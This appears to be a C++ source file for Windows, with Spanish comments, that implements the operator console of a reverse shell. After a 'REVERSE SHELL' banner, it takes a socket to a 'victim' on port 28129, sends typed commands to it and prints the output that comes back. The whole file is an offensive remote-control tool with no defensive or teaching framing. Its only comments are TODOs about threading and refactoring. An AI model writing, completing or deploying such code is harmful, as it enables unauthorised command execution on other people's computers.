#include <WinSock2.h>
#include <iostream>
#include <string>
#include <thread>
#include <future>
#include <WS2tcpip.h>
#include "errors.hpp"
#include "connections.hpp"
#pragma comment(lib, "Ws2_32.lib")

#define port 28129

// TODO: Arreglar el tema de q el hilo secundario aun sigue aun q se cause un error en el hilo principal causa error


int main()
{
    std::cout << "############################\n";
    std::cout << "##      REVERSE SHELL     ##\n";
    std::cout << "############################\n";
    SOCKET victim = connect_to_client(port);

    // TODO: Mover esto a otra parte o ponerlo en una clase
    auto th = std::async(std::launch::async, [&]
                         {
        while (true){
            std::string buf;
            std::getline(std::cin,buf);
            buf += '\n';
            if (send(victim,buf.c_str(),buf.size(),NULL) < 0) error("no se pudo enviar mensaje",GetLastError());
        } });

    while (true)
    {
        char bufc[100];
        ZeroMemory(bufc, sizeof(bufc));
        int r = recv(victim, bufc, sizeof(bufc), NULL);
        if (r > 0) std::cout << bufc << std::endl;
        else if (r < 0) error("no se recibio bien el mensaje", WSAGetLastError());
    }
    return 0;
}